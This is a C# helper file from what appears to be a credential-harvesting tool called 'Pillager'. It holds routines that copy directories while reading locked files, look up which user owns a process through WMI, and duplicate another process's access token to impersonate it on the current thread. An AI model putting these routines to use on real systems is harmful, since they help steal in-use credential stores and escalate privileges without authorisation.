using System;
using System.IO;
using System.Management;

namespace Pillager.Helper
{
    internal class Methods
    {
        public static void CopyDirectory(string sourceDir, string destinationDir, bool recursive)
        {
            var dir = new DirectoryInfo(sourceDir);

            if (!dir.Exists)
                throw new DirectoryNotFoundException($"Source directory not found: {dir.FullName}");

            DirectoryInfo[] dirs = dir.GetDirectories();
            Directory.CreateDirectory(destinationDir);
            foreach (FileInfo file in dir.GetFiles())
            {
                string targetFilePath = Path.Combine(destinationDir, file.Name);
                try
                {
                    File.WriteAllBytes(targetFilePath, File.ReadAllBytes(file.FullName));
                }
                catch
                {
                    byte[] filebytes = LockedFile.ReadLockedFile(file.FullName);
                    if (filebytes != null)
                    {
                        File.WriteAllBytes(targetFilePath, filebytes);
                    }
                }
            }

            if (recursive)
            {
                foreach (DirectoryInfo subDir in dirs)
                {
                    string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
                    CopyDirectory(subDir.FullName, newDestinationDir, true);
                }
            }
        }

        public static string GetProcessUserName(int pID)
        {
            string text1 = null;
            SelectQuery query1 = new SelectQuery("Select * from Win32_Process WHERE processID=" + pID);
            ManagementObjectSearcher searcher1 = new ManagementObjectSearcher(query1);
            try
            {
                foreach (ManagementObject disk in searcher1.Get())
                {
                    ManagementBaseObject inPar = null;
                    ManagementBaseObject outPar = null;
                    inPar = disk.GetMethodParameters("GetOwner");
                    outPar = disk.InvokeMethod("GetOwner", inPar, null);
                    text1 = outPar["User"].ToString();
                    break;
                }
            }
            catch
            {
                text1 = "SYSTEM";
            }
            return text1;
        }

        public static bool ImpersonateProcessToken(int pid)
        {
            IntPtr hProcess = Native.OpenProcess(Native.PROCESS_ACCESS_FLAGS.PROCESS_QUERY_INFORMATION, true, pid);
            if (hProcess == IntPtr.Zero) return false;
            IntPtr hToken;
            if (!Native.OpenProcessToken(hProcess, 0x00000002 | 0x00000004, out hToken)) return false;
            IntPtr DuplicatedToken = new IntPtr();
            if (!Native.DuplicateToken(hToken, 2, ref DuplicatedToken)) return false;
            if (!Native.SetThreadToken(IntPtr.Zero, DuplicatedToken)) return false;
            return true;
        }
    }
}
